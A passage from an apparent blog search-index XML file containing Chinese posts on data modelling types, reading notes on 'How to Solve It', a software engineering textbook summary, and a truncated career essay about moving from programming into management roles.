but does not allow you to model views, indexes and other elements that are available in the more concrete physical data model (PDM). 逻辑数据模型（LDM）可帮助您分析信息系统的结构，而不依赖于任何特定的物理数据库实现。LDM迁移了实体标识符，并且不像概念数据模型（CDM）那样抽象，但不允许您对更具体的物理数据模型（PDM）中可用的视图，索引和其他元素进行建模。 |        Physical Data,物理数据模型（PDM）          A physical data model (PDM) helps you to analyze the tables, views, and other objects in a database, including multidimensional objects necessary for data warehousing. A PDM is more concrete than a conceptual (CDM) or logical (LDM) data model. You can model, reverse-engineer, and generate for all the most popular DBMSs. 帮助您分析数据库中的表，视图和其他对象，包括数据仓库所需的多维对象。PDM比概念（CDM）或逻辑（LDM）数据模型更具体。您可以为所有最流行的DBMS建模、反向工程和生成。                                                                                                                  |        Object Oriented,面向对象模型（OOM）          An object-oriented model (OOM) helps you analyze an information system through use cases, structural and behavioral analysis, and in terms of deployment, using the Unified Modeling Language (UML). You can model, reverse-engineer, and generate for Java, .NET and other languages.        Business Process | 业务处理模型（BPM）          A business process diagram (or process flow diagram) provides a graphical view of the control flow (the sequence of execution) or data flow (the exchange of data) between processes at any level in your system. 从业务人员的角度对业务逻辑和规则进行详细描述的概念模型，并使用流程图表示从一个或多个起点到终点间的处理过程、流程、消息和协作协议。      CDM、PDM和OOM之间的关系]]></content>
      <categories>
        
          <category> software </category>
        
      </categories>
      <tags>
        
          <tag> DataBase </tag>
        
          <tag> Tool </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[How to Solve It?]]></title>
      <url>/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2017/06/15/how-to-solve-it/</url>
      <content type="text"><![CDATA[1 写在前面最近阅读了《How to Solve It》一书，以下内容是对书中的一些句子做的记录。2 在教室中1.学生应当尽可能多的独立工作……老师对学生的帮助应当不多不少。2.希望提高学生解题能力的教师，必须培养学生的兴趣，然后给他们提供大量的机会去模仿与实践。3.弄清楚问题》思考之间的联系，制定计划》实现计划》检查和讨论。4.回答一个你尚未弄清楚的问题是愚蠢的，去做一件你不愿意干的事情是可悲的。3 怎样解题1.熟悉问题：我应该从何入手？我能做什么？2.深入理解问题：这么做，可以起到什么样的作用？3.探索：如何进行？能找出什么？4.实现计划》回顾探索法小词典：&gt;类比&gt;辅助元素&gt;辅助问题]]></content>
      <categories>
        
          <category> 软件工程 </category>
        
      </categories>
      <tags>
        
          <tag> 思维方式 </tag>
        
          <tag> 解决问题 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[软件工程]]></title>
      <url>/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2017/06/13/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 第一部分 软件工程导论对软件工程做一般性的介绍。1.1 概述软件工程是关于软件生产的工程学科。软件产品有分类：通用软件产品，如数据库软件、字处理软件。定制软件产品。目前，这两类产品之间的界线变得模糊，因为现在更多的公司从一个通用软件产品开始进行定制处理，以满足特别客户的具体要求。好软件的重要属性：可维护性可依赖性和安全性有效性可用性软件过程是指制作软件产品的一组活动及其结果。所有的软件过程都包含4项基本活动：软件描述、软件开发、软件有效性验证、软件进化。有很多软件的基本方法适用于所有类型的软件系统：应使用有管理的和理解了的开发过程进行开发。可依赖性和性能对所有类型的系统来说都很重要。理解和管理系统描述和需求很重要。尽可能高效地使用当前存在的资源。软件工程的职业道德保密工作能力知识产权计算机滥用案例简介胰岛素泵控制系统（嵌入式系统）用于心理健康治疗的患者信息系统野外气象站（基于传感器的信息采集系统）要点归纳软件工程是一门涉及软件生产的各方面的一门工程学科。软件产品不仅是程序，还包括文档。软件产品的基本属性是可维护性、可靠性、信息安全性、效率以及可接受性。软件过程包括开发软件产品过程中的所有活动。软件过程中的活动主要有：软件描述、软件开发、软件有效性验证、软件进化。软件工程的基本概念普遍适用于所有类型的系统开发。这些基本概念包括软件过程、可靠性、信息安全性、需求以及复用。世界上存在着很多类型的系统。每一种类型的系统的开发都需要一种与之相适应的软件工程工具和技术。几乎不存在普适的神奇的软件设计和实现技术。软件工程的基本思想适用于所有的软件系统。这些基本思想包括有管理的软件过程、软件的可依赖性和安全性、需求工程和软件复用。软件工程人员对软件工程行业和整个社会负有责任，不应该只关心技术问题。职业协会颁布的行为准则则规定了一系列协会成员应该遵守的行为准则。1.2 软件过程软件过程模型Table 1: 软件过程模型瀑布模型基本开发活动：需求分析和定义&#xa0;系统和软件设计&#xa0;实现和单元测试&#xa0;集成和系统测试&#xa0;运行和维护增量式开发思想：先开发出一个初始版本，给用户使用并听取用户的意见和建议，通过对多个版本的不断修改知道产生一个充分的系统。&#xa0;从管理角度上看，存在着两个问题：过程不可见；伴随着新的增量的增加，系统结构在逐步退化。面向复用的软件工程开发阶段：组件分析; 需求修改; 使用复用的系统设计; 开发和集成瀑布模型：该模型将基本的过程活动、描述、开发、有效性验证和进化，看成是一些界限分明的过程阶段。如，需求描述阶段、软件设计阶段、实现阶段、测试阶段，等等。增量式开发面向复用的软件工程：基于大量可复用的组件开发。过程活动软件描述：软件描述或需求工程是理解和定义系统需要提供哪些服务，以及找出开发和运行中收到哪些约束。需求工程4个主要的阶段：可行性研究需求导出和分析需求描述需求有效性验证软件设计和实现软件设计是对实现软件的结构、系统的数据、系统组件间的接口以及所用的算法的描述。Table 2: 软件设计和实现设计输入平台信息、需求描述、数据描述设计活动体系结构设计、接口设计、组件设计、数据库设计设计输出系统提醒结构、数据库描述、接口描述、组件描述软件有效性验证:软件有效性验证，通常也称为检验和有效性验证（V&amp;V），是要看系统是否符合他的描述和客户的预期。程序测试，即用模拟测试数据运行系统，是最基本的有效性验证技术。测试过程中的阶段：组件（或单元）测试系统测试接收测试软件进化（软件维护）应对变更两个方法用于降低返工成本：变更避免变更容忍两种应对变更系统需求的方法：系统原型（原型构造）增量交付Boehm的螺旋模型Rational统计过程Rational统计过程是新式基本过程模型，其特点是由阶段（开端、细化、构造和转换）所构成，但是它把活动（需求、分析和设计等）和阶段相区别。要点归纳软件过程是产生一个软件系统的一系列活动。软件过程模型是这些过程的抽象表示。一般过程模型描述软件过程的组成。一般过程模型实例包括瀑布模型、增量式开发、面向复用的开发。需求工程是开发软件描述的过程。描述的目的是向开发者传达客户方对系统的需要。设计和实现过程是对需求描述转换为一个可运行的软件系统的过程。系统话的设计方法用来完成这个转换。软件有效性验证是检查系统是否与它的描述相一致，以及是否符合系统用户的真正需要的过程。软件进化是修改已存在的软件系统以适应用户新的需求的过程。变更是一个持续的过程，软件必须在变更过程中保持可用。过程应包含应对变更的活动。这可能包含一个原型构造阶段，以帮助避免在需求和设计上的错误决定。过程也应该适应迭代和交付，这样变更时就不会对整个系统带来干扰。Rational统一过程是新式基本过程模型，其特点是由阶段（开端、细化、构造和转换）所构成可，但是它把活动（需求、分析和设计等）和阶段相区别。1.3 敏捷开发1.4 需求工程1.5 UML语言对系统建模1.6 体系结构设计1.7 面向对象的设计和设计模式的使用1.8 软件测试1.9 软件进化2 第二部分 可依赖性和信息安全性2.1 社会技术系统2.2 可依赖性与信息安全性2.3 可依赖性与信息安全性描述2.4 可依赖性工程2.5 信息安全工程2.6 可依赖性与信息安全保证 3 第三部分 高级软件工程3.1 软件复用3.2 基于组件的软件工程3.3 分布式软件工程3.4 面向服务的体系结构3.5 嵌入式软件3.6 面向对象的软件工程4 第四部分 软件管理4.1 项目管理4.2 项目规划4.3 质量管理4.4 配置管理4.5 过程改善]]></content>
      <categories>
        
          <category> 软件工程 </category>
        
      </categories>
      <tags>
        
          <tag> 软件工程 </tag>
        
          <tag> 系统建模 </tag>
        
          <tag> 软件管理 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[程序员的“非程序员”之路]]></title>
      <url>/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2017/06/11/programmer-is-no/</url>
      <content type="text"><![CDATA[1 写在前面时间：2016-04-13作者：张传波2 摘要20&#22810;&#24180;&#21069;&#25105;&#23601;&#24320;&#22987;&#20889;&#20195;&#30721;&#65292;&#24456;&#21916;&#27426;&#20889;&#20195;&#30721;&#65292;&#30452;&#21040;&#29616;&#22312;&#20026;&#27490;&#20173;&#28982;&#28909;&#24230;&#19981;&#20943;&#65281;&#20154;&#29983;&#24635;&#26159;&#20250;&#21644;&#20320;&#24320;&#28857;&#23567;&#29609;&#31505;&#65292;&#25105;&#22312;&#22810;&#24180;&#20043;&#21069;&#36208;&#19978;&#20102;&#8221;&#38750;&#31243;&#24207;&#21592;&#8220;&#20043;&#36335;&#12290;&#25105;&#35273;&#24471;&#26080;&#35770;&#20320;&#23558;&#26469;&#26159;&#21542;&#32487;&#32493;&#36208;&#25216;&#26415;&#36335;&#32447;&#65292;&#20320;&#30340;&#31243;&#24207;&#21592;&#32463;&#21382;&#23558;&#20026;&#20320;&#25171;&#19979;&#38596;&#21402;&#30340;&#22522;&#30784;&#12290;&#26412;&#25991;&#20026;&#20320;&#20998;&#20139;&#25105;&#30340;&#19968;&#20123;&#24515;&#24471;&#65292;&#20026;&#20320;&#20998;&#20139;&#19968;&#20123;&#31243;&#24207;&#21592;&#20063;&#24212;&#35813;&#25484;&#25569;&#30340;&#8221;&#38750;&#31243;&#24207;&#21592;&#8220;&#25216;&#33021;&#65292;&#24076;&#26395;&#23545;&#20320;&#26377;&#24110;&#21161;&#12290;3 什么是”非程序员“？&#20160;&#20040;&#26159;&#31243;&#24207;&#21592;&#65311;&#36825;&#24212;&#35813;&#19981;&#29992;&#35299;&#37322;&#20102;&#12290;&#25152;&#20197;&#8221;&#38750;&#31243;&#24207;&#21592;&#8220;&#23601;&#24456;&#23481;&#26131;&#35299;&#37322;&#20102;&#65292;&#21482;&#35201;&#20320;&#20174;&#20107;&#30340;&#26159;IT&#31867;&#24037;&#20316;&#65292;&#20294;&#21448;&#19981;&#26159;&#20889;&#20195;&#30721;&#30340;&#65292;&#20320;&#23601;&#26159;&#8221;&#38750;&#31243;&#24207;&#21592;&#8220;&#65281;&#8221;&#38750;&#31243;&#24207;&#21592;&#8220;&#24120;&#35265;&#30340;&#32844;&#20301;&#26377;&#65306;&#39033;&#30446;&#32463;&#29702;&#12289;&#20135;&#21697;&#32463;&#29702;&#12289;&#27979;&#35797;&#24037;&#31243;&#24072;&#12289;&#37197;&#32622;&#31649;&#29702;&#21592;&#12289;&#23454;&#26045;&#24037;&#31243;&#24072;&#12289;SQA&#31561;&#65307;&#38500;&#27492;&#20197;&#22806;&#36824;&#26377;&#37096;&#38376;&#32463;&#29702;&#12289;&#21103;&#24635;&#12289;&#24635;&#32463;&#29702;&#12289;&#32769;&#26495;&#65281;&#25353;&#29031;&#26102;&#38388;&#39034;&#24207;&#65292;&#25105;&#20570;&#36807;&#30340;&#32844;&#20301;&#26377;&#65306;&#31243;&#24207;&#21592;&#12289;&#39033;&#30446;&#32463;&#29702;&#12289;&#30740;&#21457;&#20013;&#24515;&#32463;&#29702;&#12289;&#21103;&#24635;&#32463;&#29702;&#12289;&#24120;&#21153;&#21103;&#24635;&#65292;&#21518;&#26469;&#25105;&#21019;&#19994;&#20102;&#65292;&#25152;&#20197;&#32769;&#26495;&#25105;&#20063;&#24403;&#20102;&#19968;&#22238;&#65281;&#65288;PS&#65306;&#25105;&#36825;&#20010;&#32769;&#26495;&#26159;&#20809;&#26829;&#21496;&#20196;&#65289; 4 我的程序员之路&#22914;&#26524;&#25105;&#38382;&#20320;&#65306;&#20320;&#20889;&#36807;&#20195;&#30721;&#21527;&#65311;&#20320;&#32943;&#23450;&#20250;&#35828;&#65306;&#20889;&#36807;&#65292;&#32780;&#19988;&#36824;&#20889;&#20102;&#24456;&#22810;&#65281;&#35831;&#20320;&#30041;&#24847;&#65292;&#25105;&#35828;&#30340;&#26159;&#8221;&#20889;&#8220;&#20195;&#30721;&#65292;&#32780;&#19981;&#26159;&#8221;&#25970;&#8220;&#20195;&#30721;&#22114;&#12290;&#25105;&#30340;&#36816;&#27668;&#27604;&#36739;&#22909;&#65292;&#39640;&#20013;&#19968;&#24180;&#32423;&#30340;&#26102;&#20505;&#23398;&#26657;&#23601;&#24320;&#35838;&#12298;BASIC&#35821;&#35328;&#12299;&#36825;&#38376;&#35838;&#12290;&#24403;&#26102;&#30005;&#33041;&#26159;&#24456;&#31232;&#32570;&#30340;&#36164;&#28304;&#65292;&#23478;&#37324;&#27809;&#26377;&#35745;&#31639;&#26426;&#65292;&#34429;&#28982;&#23398;&#26657;&#26377;&#35745;&#31639;&#26426;&#25151;&#65292;&#20294;&#19978;&#26426;&#30340;&#26102;&#38388;&#24182;&#19981;&#22810;&#12290;&#24403;&#26102;&#25105;&#32534;&#20889;&#31243;&#24207;&#30340;&#26041;&#24335;&#23601;&#26159;&#29992;&#31508;&#22312;&#32451;&#20064;&#26412;&#19978;&#20889;&#20195;&#30721;&#65292;&#35843;&#35797;&#31243;&#24207;&#30340;&#26041;&#27861;&#23601;&#26159;&#22312;&#33041;&#34955;&#37324;&#38754;&#36816;&#34892;&#36825;&#20010;&#31243;&#24207;&#12290;&#24179;&#26102;&#25105;&#20889;&#19979;&#22823;&#37327;&#30340;&#20195;&#30721;&#22312;&#32451;&#20064;&#26412;&#19978;&#65292;&#38750;&#24120;&#29645;&#24796;&#19978;&#26426;&#26102;&#38388;&#65292;&#24819;&#27048;&#24178;&#22312;&#30005;&#33041;&#25151;&#20013;&#30340;&#27599;&#19968;&#31186;&#20013;&#12290;&#34429;&#28982;&#24403;&#26102;&#25105;&#30340;&#22823;&#37096;&#20998;&#26102;&#38388;&#26159;&#22312;&#32451;&#20064;&#26412;&#19978;&#20889;&#20195;&#30721;&#65292;&#22312;&#33041;&#34955;&#20013;&#36816;&#34892;&#65292;&#20294;&#23601;&#26159;&#22240;&#20026;&#36825;&#26679;&#30340;&#32534;&#31243;&#26041;&#24335;&#25171;&#36896;&#20102;&#25105;&#30340;&#32534;&#31243;&#22522;&#26412;&#21151;&#21644;&#32032;&#20859;&#12290;&#25105;&#23545;&#35745;&#31639;&#26426;&#32534;&#31243;&#30340;&#24378;&#28872;&#20852;&#36259;&#65292;&#39537;&#20351;&#25105;&#25253;&#32771;&#22823;&#23398;&#26102;&#30340;&#31532;&#19968;&#24535;&#24895;&#23601;&#26159;&#35745;&#31639;&#26426;&#36719;&#20214;&#65292;&#20294;&#25105;&#30340;&#39640;&#32771;&#25104;&#32489;&#19981;&#29702;&#24819;&#65292;&#21482;&#32771;&#19978;&#20102;&#31532;&#20108;&#24535;&#24895;&#8230;&#8230;&#25105;&#22823;&#23398;&#35835;&#30340;&#26159;&#8221;&#22478;&#38215;&#24314;&#35774;&#8220;&#19987;&#19994;&#12290;&#36825;&#26159;&#19968;&#20010;&#8221;&#20255;&#22823;&#8220;&#30340;&#19987;&#19994;&#65292;&#25105;&#20204;&#30340;&#31995;&#20027;&#20219;&#35828;&#65306;&#36825;&#20010;&#19987;&#19994;&#26159;&#29992;&#26469;&#22521;&#20859;&#24314;&#22996;&#20027;&#20219;&#30340;&#65288;&#29616;&#22312;&#21483;&#24314;&#35774;&#23616;&#23616;&#38271;&#65289;&#65281;&#24403;&#26102;&#25105;&#20204;&#20852;&#22859;&#21644;&#33258;&#25105;&#38518;&#37257;&#20102;&#19968;&#32763;&#65292;&#32467;&#26524;&#27605;&#19994;&#26102;&#25105;&#20204;&#27809;&#26377;&#20154;&#33021;&#25214;&#21040;&#8221;&#24314;&#22996;&#20027;&#20219;&#8216;&#30340;&#24037;&#20316;&#65292;&#30452;&#21040;&#29616;&#22312;&#22909;&#20687;&#20063;&#27809;&#26377;&#21516;&#23398;&#22352;&#19978;&#20102;&#36825;&#20010;&#23703;&#20301;&#12290;&#22823;&#23398;&#27605;&#19994;&#21518;&#25105;&#22312;&#26576;&#20107;&#19994;&#21333;&#20301;&#20174;&#20107;&#24066;&#25919;&#26041;&#38754;&#30340;&#24037;&#20316;&#65292;&#20294;&#25105;&#24456;&#24555;&#24971;&#19981;&#20303;&#65292;&#25105;&#25214;&#21040;&#20102;&#19968;&#20221;&#26032;&#24037;&#20316;&#65292;&#22312;&#26576;&#36719;&#20214;&#20844;&#21496;&#20570;&#31243;&#24207;&#21592;&#65292;&#24320;&#21457;&#24314;&#31569;&#39044;&#31639;&#26041;&#38754;&#30340;&#36719;&#20214;&#65292;&#27491;&#24335;&#24320;&#22987;&#20102;&#25105;&#30340;&#31243;&#24207;&#21592;&#30340;&#29983;&#28079;&#12290;&#25509;&#30528;&#19979;&#26469;&#30340;5&#24180;&#26102;&#38388;&#65292;&#25105;&#20889;&#19979;&#20102;&#22823;&#37327;&#20195;&#30721;&#12290;&#24403;&#26102;&#25972;&#20010;&#20844;&#21496;13&#20010;&#65292;&#20854;&#20013;&#31243;&#24207;&#21592;4&#20154;&#65292;&#20294;&#20316;&#20026;&#31243;&#24207;&#21592;&#30340;&#25105;&#38500;&#20102;&#20889;&#20195;&#30721;&#65292;&#36824;&#38656;&#35201;&#33258;&#24049;&#20998;&#26512;&#38656;&#27714;&#65292;&#33258;&#24049;&#27979;&#35797;&#33258;&#24049;&#30340;&#36719;&#20214;&#65292;&#33258;&#24049;&#31649;&#29702;&#33258;&#24049;&#31561;&#12290;&#36825;&#26679;&#30340;&#24037;&#20316;&#27169;&#24335;&#65292;&#35753;&#25105;&#24471;&#21040;&#20840;&#38754;&#30340;&#38203;&#28860;&#12290;5 我的非程序员之路&#20844;&#21496;&#35268;&#27169;&#19981;&#26029;&#25193;&#22823;&#65292;&#24320;&#21457;&#20154;&#21592;&#30340;&#25968;&#37327;&#22686;&#21152;&#20102;&#19981;&#23569;&#65292;&#21518;&#26469;&#20570;&#30340;&#39033;&#30446;&#19968;&#33324;&#37117;&#20250;&#37197;&#22791;&#20960;&#21517;&#31243;&#24207;&#21592;&#21644;&#19968;&#21517;&#27979;&#35797;&#65292;&#32780;&#25105;&#8220;&#29702;&#25152;&#24403;&#28982;&#8221;&#22320;&#24403;&#19978;&#20102;&#39033;&#30446;&#32463;&#29702;&#12290;&#26368;&#24320;&#22987;&#20570;&#39033;&#30446;&#32463;&#29702;&#30340;&#26102;&#20505;&#65292;&#36824;&#21487;&#20197;&#20889;&#19968;&#20123;&#20195;&#30721;&#65292;&#21518;&#26469;&#35201;&#33457;&#26356;&#22810;&#30340;&#26102;&#38388;&#22788;&#29702;&#38656;&#27714;&#12289;&#23458;&#25143;&#20851;&#31995;&#12289;&#39033;&#30446;&#31649;&#29702;&#12289;&#22242;&#38431;&#24314;&#35774;&#31561;&#20107;&#24773;&#65292;&#22522;&#26412;&#19978;&#27809;&#26377;&#26102;&#38388;&#21435;&#20889;&#20195;&#30721;&#20102;&#12290;&#19981;&#22810;&#20037;&#65292;&#20844;&#21496;&#25171;&#31639;&#23558;&#25105;&#25512;&#21521;&#8220;&#30740;&#21457;&#20013;&#24515;&#32463;&#29702;&#8221;&#30340;&#32844;&#20301;&#65292;&#36825;&#26159;&#19968;&#20010;&#33707;&#22823;&#30340;&#35825;&#24785;&#65281;&#21018;&#25509;&#20219;&#30740;&#21457;&#20013;&#24515;&#32463;&#29702;&#19968;&#32844;&#65292;&#36824;&#26399;&#26395;&#33021;&#26377;&#19968;&#21322;&#26102;&#38388;&#26469;&#30740;&#31350;&#25216;&#26415;&#65292;&#23454;&#38469;&#19978;&#36825;&#26159;&#19981;&#21487;&#33021;&#28404;&#12290;&#21518;&#26469;&#25105;&#36824;&#20808;&#21518;&#36127;&#36131;&#20102;ISO9001&#12289;CMM3&#32423;&#21644;CMMI5&#32423;&#30340;&#24037;&#20316;&#12290;&#25105;&#20174;&#24515;&#37324;&#38754;&#20854;&#23454;&#26159;&#26356;&#21916;&#27426;&#36208;&#25216;&#26415;&#36335;&#32447;&#30340;&#65292;&#24403;&#21021;&#36873;&#25321;&#20102;&#31649;&#29702;&#36335;&#32447;&#35753;&#25105;&#36367;&#19978;&#20102;&#8220;&#19981;&#24402;&#36335;&#8221;&#12290;&#25105;&#21407;&#26412;&#22312;&#25216;&#26415;&#19978;&#26377;&#24456;&#22810;&#8220;&#31532;&#19968;&#8221;&#65306;&#20844;&#21496;&#20013;&#32534;&#31243;&#26368;&#29087;&#32451;&#30340;&#31532;&#19968;&#20154;&#65292;&#31532;&#19968;&#20010;&#26368;&#29087;&#24713;C#&#65292;&#31532;&#19968;&#20010;&#26368;&#29087;&#24713;SQLServer&#31561;&#31561;&#65292;&#22810;&#24180;&#25152;&#20174;&#20107;&#30340;&#8220;&#38750;&#31243;&#24207;&#21592;&#8221;&#24037;&#20316;&#34429;&#28982;&#35753;&#25105;&#25484;&#25569;&#20102;&#19981;&#23569;&#26032;&#25216;&#33021;&#65292;&#20294;&#21516;&#26102;&#20063;&#22312;&#25216;&#26415;&#19978;&#8220;&#24223;&#25481;&#8221;&#20102;&#25105;&#30340;&#27494;&#21151;&#12290;&#22914;&#26524;&#19978;&#22825;&#20877;&#32473;&#25105;&#19968;&#27425;&#26426;&#20250;&#65292;&#25105;&#20250;&#19981;&#20250;&#20173;&#28982;&#36873;&#25321;&#36825;&#26679;&#30340; &#19968;&#26465;&#36335;&#21602;&#65311;&#19990;&#30028;&#19978;&#27809;&#26377;&#36825;&#20040;&#22810;&#22914;&#26524;&#65292;&#25105;&#20204;&#21482;&#33021;&#20570;&#21040;&#24635;&#32467;&#20197;&#21069;&#65292;&#25226;&#25569;&#29616;&#22312;&#65292;&#38754;&#21521;&#26410;&#26469;&#12290;&#19978;&#25991;&#31616;&#20171;&#20102;&#25105;&#30340;&#32463;&#21382;&#65292;&#19979;&#38754;&#24320;&#22987;&#20026;&#20998;&#20139;&#19968;&#20123;&#25105;&#30340;&#24515;&#24471;&#20307;&#20250;&#65292;&#26080;&#35770;&#20320;&#26159;&#21542;&#25171;&#31639;&#32487;&#32493;&#36208;&#25216;&#26415;&#20043;&#36335;&#65292;&#24076;&#26395;&#23545;&#20320;&#33021;&#26377;&#24110;&#21161;&#12290;6 关于程序员的几个误区1.&#65289;30&#23681;&#19981;&#33021;&#20877;&#24178;&#31243;&#24207;&#21592;&#24403;&#24180;&#19981;&#30693;&#36947;&#35841;&#35828;&#31243;&#24207;&#21592;&#19981;&#36866;&#21512;&#24178;&#21040;30&#23681;&#65292;&#22240;&#20026;&#20154;&#33041;&#36234;&#32769;&#36234;&#19981;&#36866;&#24212;&#36825;&#26679;&#30340;&#24037;&#20316;&#65292;&#31243;&#24207;&#21592;&#35201;&#36225;30&#23681;&#21069;&#20570;&#22909;&#36716;&#22411;&#30340;&#20934;&#22791;&#12290;&#25105;&#24403;&#20570;&#20102;&#30740;&#21457;&#20013;&#24515;&#32463;&#29702;&#65292;&#36873;&#25321;&#20102;&#31649;&#29702;&#36335;&#32447;&#65292;&#20854;&#20013;&#19968;&#37096;&#20998;&#21407;&#22240;&#23601;&#26159;&#21463;&#36825;&#20010;&#8220;30&#23681;&#19981;&#33021;&#20877;&#24178;&#31243;&#24207;&#21592;&#8221;&#30340;&#24433;&#21709;&#65281;&#22269;&#22806;&#22235;&#20116;&#21313;&#23681;&#30340;&#31243;&#24207;&#21592;&#24456;&#22810;&#65292;&#20154;&#23478;&#20889;&#30340;&#20195;&#30721;&#36234;&#32769;&#36234;&#29275;B&#65292;&#33041;&#34955;&#30340;&#24605;&#32771;&#33021;&#21147;&#23436;&#20840;&#19981;&#35265;&#21040;&#20943;&#36864;&#65292;&#21453;&#32780;&#36234;&#21457;&#21385;&#23475;&#65292;&#25152;&#20197;"30&#23681;&#19981;&#33021;&#20877;&#24178;&#31243;&#24207;&#21592;"&#23601;&#26159;&#19968;&#21477;&#22353;&#29241;&#30340;&#35805;&#65281;&#24403;&#28982;&#36825;&#21477;&#35805;&#22312;&#20013;&#22269;&#35828;&#26159;&#26377;&#32972;&#26223;&#30340;&#65292;&#37027;&#23601;&#26159;&#31243;&#24207;&#21592;&#27809;&#26085;&#27809;&#22812;&#30340;&#21152;&#29677;&#65292;&#22914;&#26524;&#26159;&#36825;&#26679;&#30340;&#29366;&#24577;&#65292;&#24403;&#28982;&#26159;&#24456;&#38590;&#25384;&#21040;30&#23681;&#30340;&#12290;&#25152;&#20197;&#25105;&#20204;&#35201;&#20445;&#25252;&#22909;&#33258;&#24049;&#30340;&#36523;&#20307;&#36164;&#28304;&#65292;&#29305;&#21035;&#26159;&#33041;&#34955;&#65292;&#35760;&#20303;&#20004;&#21477;&#35805;&#65306;a&#65289;&#21152;&#29677;&#26377;&#23475;&#20581;&#24247;&#65281;b&#65289;&#24037;&#20316;&#26159;&#20844;&#21496;&#30340;&#65292;&#36523;&#20307;&#26159;&#33258;&#24049;&#30340;&#65281;2&#65289;&#31243;&#24207;&#21592; = &#30721;&#20892;&#19968;&#20123;&#22806;&#34892;&#39046;&#23548;&#35748;&#20026;&#31243;&#24207;&#21592;&#23601;&#26159;&#19968;&#31181;&#20302;&#25216;&#26415;&#21547;&#37327;&#30340;&#24037;&#31181;&#65292;&#38543;&#20415;&#22312;&#34903;&#19978;&#21487;&#20197;&#25235;&#19968;&#25226;&#65292;&#20320;&#19981;&#24178;&#36824;&#26377;&#24456;&#22810;&#20154;&#24178;&#65281;&#23601;&#31639;&#26159;&#25105;&#20204;&#31243;&#24207;&#21592;&#26412;&#36523;&#65292;&#20063;&#23558;&#33258;&#24049;&#33258;&#22066;&#20026;&#8220;&#30721;&#20892;&#8221;&#12290;&#31243;&#24207;&#21592;&#26159;&#39640;&#25216;&#26415;&#21547;&#37327;&#30340;&#24037;&#31181;&#65292;&#22914;&#26524;&#20320;&#25484;&#25569;&#20102;&#26680;&#24515;&#25216;&#26415;&#65292;&#20320;&#26159;&#30456;&#24403;&#20540;&#38065;&#30340;&#65281;&#20294;&#26159;&#22312;&#25105;&#20204;&#20013;&#22269;&#39640;&#25216;&#26415;&#21547;&#37327;&#39033;&#30446;&#25110;&#36719;&#20214;&#22826;&#23569;&#20102;&#65292;&#25152;&#20197;&#22914;&#26524;&#20320;&#36830;&#32493;&#20960;&#20010;&#26376;&#35273;&#24471;&#33258;&#24049;&#25216;&#26415;&#19978;&#27809;&#26377;&#20160;&#20040;&#36827;&#27493;&#30340;&#35805;&#65292;&#20320;&#35201;&#24819;&#21150;&#27861;&#25214;&#19968;&#20123;&#26356;&#26377;&#25361;&#25112;&#30340;&#24037;&#20316;&#20102;&#12290;3&#65289;&#25484;&#25569;&#30340;&#24320;&#21457;&#35821;&#35328;&#36234;&#22810;&#36234;&#28526;&#23601;&#36234;&#22909;&#24320;&#21457;&#35821;&#35328;&#19981;&#22312;&#22810;&#65292;&#22312;&#20110;&#31934;&#65281;&#23545;&#20110;&#32534;&#31243;&#32769;&#25163;&#26469;&#35828;&#65292;&#25484;&#25569;&#19968;&#38376;&#24320;&#21457;&#35821;&#35328;&#30340;&#35821;&#27861;&#21487;&#33021;&#21482;&#38656;&#35201;&#20960;&#22825;&#30340;&#26102;&#38388;&#65292;&#20294;&#32534;&#31243;&#30340;&#32032;&#20859;&#21644;&#28145;&#21402;&#30340;&#32534;&#31243;&#21151;&#21147;&#26159;&#38656;&#35201;&#22810;&#24180;&#27785;&#28096;&#30340;&#12290;&#25105;&#21018;&#23398;&#20250;&#25105;&#30340;&#31532;&#19968;&#31181;&#24320;&#21457;&#35821;&#35328;BASIC&#65292;&#33258;&#35748;&#20026;&#24863;&#35273;&#33391;&#22909;&#65292;&#33258;&#20197;&#20026;&#20973;&#20511;&#33258;&#24049;&#23567;&#32874;&#26126;&#23601;&#33021;&#36816;&#29992;BASIC&#20889;&#20986;&#24456;&#24378;&#22823;&#30340;&#31243;&#24207;&#12290;&#21518;&#26469;&#21442;&#21152;&#20102;&#31243;&#24207;&#21592;&#20852;&#36259;&#23567;&#32452;&#23398;&#20064;&#29677;&#65292;&#31995;&#32479;&#22320;&#23398;&#20064;&#20102;&#19968;&#20123;&#31639;&#27861;&#65292;&#25165;&#21457;&#29616;&#33258;&#24049;&#26159;&#20117;&#24213;&#20043;&#34521;&#12290;&#21018;&#24320;&#22987;&#24037;&#20316;&#30340;&#20960;&#24180;&#24320;&#21457;&#35821;&#35328;&#29992;&#30340;&#26159;VB&#65292;&#36824;&#23398;&#20064;&#20102;&#19968;&#20123;&#35774;&#35745;&#27169;&#24335;&#65292;&#33258;&#20197;&#20026;&#33258;&#24049;&#24456;OO&#65292;&#21518;&#26469;&#38543;&#30528;&#24037;&#20316;&#32463;&#39564;&#30340;&#31215;&#32047;&#21644;&#36935;&#21040;&#19981;&#21516;&#30340;&#38382;&#39064;&#65292;&#25165;&#21457;&#29616;&#33258;&#24049;&#26159;&#22810;&#20040;&#30340;&#32932;&#27973;&#12290;&#32534;&#31243;&#22522;&#26412;&#21151;&#38656;&#35201;&#22312;&#23398;&#26657;&#38454;&#27573;&#23601;&#25171;&#36896;&#65292;&#24182;&#19988;&#35201;&#35753;&#33258;&#24049;&#29233;&#19978;&#32534;&#31243;&#12290;&#38500;&#20102;&#35201;&#35748;&#30495;&#23436;&#25104;&#25152;&#26377;&#32534;&#31243;&#35838;&#31243;&#30340;&#35838;&#21518;&#20316;&#19994;&#12289;&#32451;&#20064;&#21644;&#35838;&#31243;&#35774;&#35745;&#22806;&#65292;&#20320;&#33258;&#24049;&#36824;&#35201;&#23581;&#35797;&#21435;&#25361;&#25112;&#19968;&#20123;&#39640;&#25216;&#26415;&#38590;&#24230;&#30340;&#39064;&#30446;&#12290;&#32473;&#20960;&#20010;&#39064;&#30446;&#20320;&#21442;&#32771;&#19968;&#19979;&#65306;a&#65289;&#20889;&#19968;&#20010;&#20116;&#23376;&#26827;&#65288;&#25110;&#35937;&#26827;